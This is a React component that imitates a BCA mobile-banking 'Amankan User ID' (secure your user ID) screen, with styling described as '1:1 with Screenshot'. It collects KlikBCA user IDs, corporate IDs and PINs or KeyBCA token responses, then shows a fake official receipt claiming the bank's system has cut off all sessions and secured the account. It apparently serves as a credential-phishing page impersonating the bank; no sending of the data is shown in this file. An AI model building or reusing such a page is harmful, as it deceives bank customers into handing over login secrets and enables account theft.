import React, { useState } from 'react';
import { ArrowLeft, User, Briefcase, Eye, EyeOff, ShieldCheck, AlertCircle, Check } from 'lucide-react';
import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
import { validateUserId, validateCorporateId, validateUserPinOrPassword } from '../utils/validation';

interface MAdminAmankanUserIdViewProps {
  onBack: () => void;
  onProceedToBatalkan?: () => void;
}

export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = ({ onBack, onProceedToBatalkan }) => {
  const [activeTab, setActiveTab] = useState<'individu' | 'bisnis'>('individu');
  const [corporateId, setCorporateId] = useState('');
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Touch tracking for real-time validation feedback
  const [touched, setTouched] = useState({
    corporateId: false,
    userId: false,
    password: false,
  });

  const markTouched = (field: keyof typeof touched) => {
    setTouched((prev) => ({ ...prev, [field]: true }));
  };

  // Real-time validations
  const userIdValidation = validateUserId(userId);
  const corporateIdValidation = activeTab === 'bisnis' ? validateCorporateId(corporateId) : { isValid: true };
  const passwordValidation = validateUserPinOrPassword(password);

  const isFormValid =
    userIdValidation.isValid &&
    corporateIdValidation.isValid &&
    passwordValidation.isValid;

  // Status modals
  const [showProcessModal, setShowProcessModal] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setTouched({
      corporateId: true,
      userId: true,
      password: true,
    });

    if (!isFormValid) return;
    setShowProcessModal(true);
  };

  const receiptData: ServiceReceiptData = {
    serviceType: 'amankan-user-id',
    serviceTitle: activeTab === 'individu' ? 'Proteksi KlikBCA Individu' : 'Proteksi KlikBCA Bisnis',
    accountIdentifier: `User ID: ${userId}`,
    additionalDetails: [
      { label: 'Kategori Akun', value: activeTab === 'individu' ? 'KlikBCA Individu' : 'KlikBCA Bisnis' },
      ...(activeTab === 'bisnis' && corporateId ? [{ label: 'Corporate ID', value: corporateId }] : []),
      { label: 'Status Sesi Login', value: 'Seluruh Sesi Diputus (0 Aktif)' },
      { label: 'Proteksi Token & KeyBCA', value: 'Tersinkronisasi Ulang' },
    ],
    note: `Seluruh sesi aktif web dan mobile pada User ID ${userId} telah diputus secara paksa oleh sistem m-Admin BCA. Kredensial telah diamankan dari akses perangkat tidak dikenal. Silakan login kembali dengan autentikasi resmi Anda.`,
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#e5ebf1] flex flex-col font-sans select-none overflow-y-auto">
      {/* 1. TOP HEADER (1:1 with Screenshot) */}
      <header className="sticky top-0 z-20 w-full bg-[#f8fafc] border-b border-[#d8e0e8] px-4 py-3 flex items-center justify-between shadow-xs">
        {/* Back Button */}
        <button
          onClick={onBack}
          type="button"
          className="p-1 -ml-1 text-[#0f3b60] hover:bg-[#e2e8f0] active:scale-95 rounded-full transition-all cursor-pointer"
          aria-label="Kembali"
        >
          <ArrowLeft size={24} strokeWidth={2.4} />
        </button>

        {/* Title */}
        <h1 className="text-[17px] sm:text-[18px] font-bold text-[#0c3b68] tracking-tight">
          Amankan User ID
        </h1>

        {/* m-BCA Status Indicator Lamp (Green square) */}
        <div className="w-4 h-4 rounded-[3px] bg-[#8ac33e] shadow-[0_0_4px_rgba(138,195,62,0.6)]" />
      </header>

      {/* 2. MAIN CONTAINER (1:1 with Screenshot) */}
      <main className="w-full max-w-[420px] mx-auto px-4 py-3 sm:py-4 flex flex-col">
        {/* Segmented Control / Tab: KlikBCA Individu vs KlikBCA Bisnis (1:1 with Screenshot) */}
        <div className="w-full bg-white rounded-xl p-1 border border-[#cbd5e1] shadow-xs mb-3 flex items-center gap-1">
          {/* Button: KlikBCA Individu */}
          <button
            type="button"
            onClick={() => setActiveTab('individu')}
            className={`flex-1 py-2 px-3 rounded-lg flex items-center justify-center gap-1.5 text-[13px] font-bold transition-all cursor-pointer ${
              activeTab === 'individu'
                ? 'bg-[#004e8f] text-white shadow-xs'
                : 'bg-transparent text-[#475569] hover:bg-slate-50'
            }`}
          >
            <User size={16} strokeWidth={2.4} />
            <span>KlikBCA Individu</span>
          </button>

          {/* Button: KlikBCA Bisnis */}
          <button
            type="button"
            onClick={() => setActiveTab('bisnis')}
            className={`flex-1 py-2 px-3 rounded-lg flex items-center justify-center gap-1.5 text-[13px] font-bold transition-all cursor-pointer ${
              activeTab === 'bisnis'
                ? 'bg-[#004e8f] text-white shadow-xs'
                : 'bg-transparent text-[#475569] hover:bg-slate-50'
            }`}
          >
            <Briefcase size={16} strokeWidth={2.4} />
            <span>KlikBCA Bisnis</span>
          </button>
        </div>

        {/* Banner Box: Autentikasi User ID Digital Banking (1:1 with Screenshot) */}
        <div className="w-full bg-white border border-[#cbd5e1] rounded-lg py-2 px-3 text-center shadow-xs mb-3">
          <h2 className="text-[13px] font-bold text-[#0c3b68] tracking-tight">
            Autentikasi User ID Digital Banking
          </h2>
        </div>

        {/* Form Inputs (1:1 with Screenshot) */}
        <form onSubmit={handleSubmit} className="space-y-2.5 w-full">
          {/* Corporate ID (jika tab KlikBCA Bisnis dipilih) */}
          {activeTab === 'bisnis' && (
            <div className="animate-in fade-in duration-150">
              <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
                Corporate ID
              </label>
              <div className="relative">
                <input
                  type="text"
                  placeholder="Masukkan Corporate ID Bisnis"
                  value={corporateId}
                  onChange={(e) => {
                    setCorporateId(e.target.value.toUpperCase());
                    if (!touched.corporateId && e.target.value.length >= 2) {
                      markTouched('corporateId');
                    }
                  }}
                  onBlur={() => markTouched('corporateId')}
                  className={`w-full bg-white border rounded-lg px-3 py-2 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs uppercase tracking-wider pr-9 ${
                    touched.corporateId && !corporateIdValidation.isValid
                      ? 'border-red-500 ring-1 ring-red-500/30'
                      : corporateId && corporateIdValidation.isValid
                      ? 'border-emerald-500 ring-1 ring-emerald-500/20'
                      : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
                  }`}
                />
                <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
                  {corporateId && corporateIdValidation.isValid ? (
                    <Check size={17} className="text-emerald-600" />
                  ) : touched.corporateId && !corporateIdValidation.isValid ? (
                    <AlertCircle size={17} className="text-red-500" />
                  ) : null}
                </div>
              </div>
              {touched.corporateId && !corporateIdValidation.isValid && (
                <p className="text-[11px] text-red-600 mt-1 flex items-center gap-1 animate-in fade-in duration-150">
                  <AlertCircle size={12} className="shrink-0" />
                  <span>{corporateIdValidation.message}</span>
                </p>
              )}
            </div>
          )}

          {/* 1. User ID KlikBCA */}
          <div>
            <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
              User ID KlikBCA
            </label>
            <div className="relative">
              <input
                type="text"
                placeholder="Masukkan User ID Anda"
                value={userId}
                onChange={(e) => {
                  setUserId(e.target.value.toUpperCase());
                  if (!touched.userId && e.target.value.length >= 3) {
                    markTouched('userId');
                  }
                }}
                onBlur={() => markTouched('userId')}
                className={`w-full bg-white border rounded-lg px-3 py-2 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs uppercase tracking-wider pr-9 ${
                  touched.userId && !userIdValidation.isValid
                    ? 'border-red-500 ring-1 ring-red-500/30'
                    : userId && userIdValidation.isValid
                    ? 'border-emerald-500 ring-1 ring-emerald-500/20'
                    : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
                }`}
              />
              <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
                {userId && userIdValidation.isValid ? (
                  <Check size={17} className="text-emerald-600" />
                ) : touched.userId && !userIdValidation.isValid ? (
                  <AlertCircle size={17} className="text-red-500" />
                ) : null}
              </div>
            </div>
            {touched.userId && !userIdValidation.isValid && (
              <p className="text-[11px] text-red-600 mt-1 flex items-center gap-1 animate-in fade-in duration-150">
                <AlertCircle size={12} className="shrink-0" />
                <span>{userIdValidation.message}</span>
              </p>
            )}
            {userId && userIdValidation.isValid && (
              <p className="text-[11px] text-emerald-600 mt-1 flex items-center gap-1 animate-in fade-in duration-150">
                <Check size={12} className="shrink-0" />
                <span>Format User ID sesuai</span>
              </p>
            )}
          </div>

          {/* 2. PIN / Password */}
          <div>
            <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
              PIN / Password
            </label>
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Masukkan PIN / Respon KeyBCA"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (!touched.password && e.target.value.length >= 3) {
                    markTouched('password');
                  }
                }}
                onBlur={() => markTouched('password')}
                className={`w-full bg-white border rounded-lg px-3 py-2 pr-16 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs ${
                  touched.password && !passwordValidation.isValid
                    ? 'border-red-500 ring-1 ring-red-500/30'
                    : password && passwordValidation.isValid
                    ? 'border-emerald-500 ring-1 ring-emerald-500/20'
                    : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
                }`}
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-2.5 gap-1.5">
                {password && passwordValidation.isValid ? (
                  <Check size={17} className="text-emerald-600" />
                ) : touched.password && !passwordValidation.isValid ? (
                  <AlertCircle size={17} className="text-red-500" />
                ) : null}
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="p-1 text-[#64748b] hover:text-[#0c3b68] transition-colors cursor-pointer"
                  aria-label={showPassword ? 'Sembunyikan password' : 'Lihat password'}
                >
                  {showPassword ? (
                    <EyeOff size={18} strokeWidth={2} />
                  ) : (
                    <Eye size={18} strokeWidth={2} />
                  )}
                </button>
              </div>
            </div>
            {touched.password && !passwordValidation.isValid && (
              <p className="text-[11px] text-red-600 mt-1 flex items-center gap-1 animate-in fade-in duration-150">
                <AlertCircle size={12} className="shrink-0" />
                <span>{passwordValidation.message}</span>
              </p>
            )}
          </div>

          {/* 3. Notice / Information Box (1:1 with Screenshot) */}
          <div className="bg-white border border-[#cbd5e1] rounded-lg p-2.5 mt-1 shadow-xs">
            <p className="text-[11px] leading-relaxed text-[#475569]">
              Proteksi akses User ID KlikBCA secara langsung memutuskan sesi login
              mencurigakan pada seluruh perangkat yang terhubung.
            </p>
          </div>

          {/* 4. Action Buttons: Cancel & OK (1:1 with Screenshot) */}
          <div className="grid grid-cols-2 gap-3 pt-1 pb-6 mt-2">
            {/* Cancel Button */}
            <button
              type="button"
              onClick={onBack}
              className="w-full py-2.5 px-4 rounded-lg bg-[#d5dde5] hover:bg-[#c6d1db] active:bg-[#b8c6d3] text-[#1e3853] font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
            >
              Cancel
            </button>

            {/* OK Button with hover scaling feedback */}
            <button
              type="submit"
              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs hover:scale-[1.01] active:scale-[0.98] text-center"
            >
              OK
            </button>
          </div>
        </form>
      </main>

      {/* Confirmation Modal */}
      {/* Countdown Processing & Official Success Modal (1:1 with Recording) */}
      <ServiceProcessModal
        isOpen={showProcessModal}
        data={receiptData}
        countdownSeconds={6}
        onClose={() => {
          setShowProcessModal(false);
          if (onProceedToBatalkan) {
            onProceedToBatalkan();
          } else {
            onBack();
          }
        }}
      />
    </div>
  );
};
